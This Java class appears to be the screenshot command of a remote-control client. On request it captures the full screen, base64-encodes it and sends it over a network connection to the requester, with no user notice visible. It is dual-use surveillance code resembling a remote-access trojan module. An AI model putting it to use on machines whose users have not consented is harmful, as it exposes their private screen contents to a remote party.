package Classes.Instructions;

import Classes.Connection;
import Classes.Instruction;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.UncheckedIOException;
import java.util.Base64;
import java.util.HashMap;


public class ScreenLooker extends Instruction {
    public static String type = "screenlooker";

    public ScreenLooker(Connection connection) {
        super(connection, type);
    }

    public static String imgToBase64String(final BufferedImage img, final String formatName)
    {
        final ByteArrayOutputStream os = new ByteArrayOutputStream();

        try
        {
            ImageIO.write(img, formatName, os);
            return Base64.getEncoder().encodeToString(os.toByteArray());
        }
        catch (final IOException ioe)
        {
            throw new UncheckedIOException(ioe);
        }
    }

    public void execute(HashMap<String, Object> arguments, String from) throws IOException, AWTException {
        BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));

        HashMap<String, String> toSend = new HashMap<String, String>();
        String img = imgToBase64String(image, "PNG");

        toSend.put("type", "reply");
        toSend.put("to", from);
        toSend.put("img", img);

        String finishedString = json.toJson(toSend);

        connection.send(finishedString);
    }
}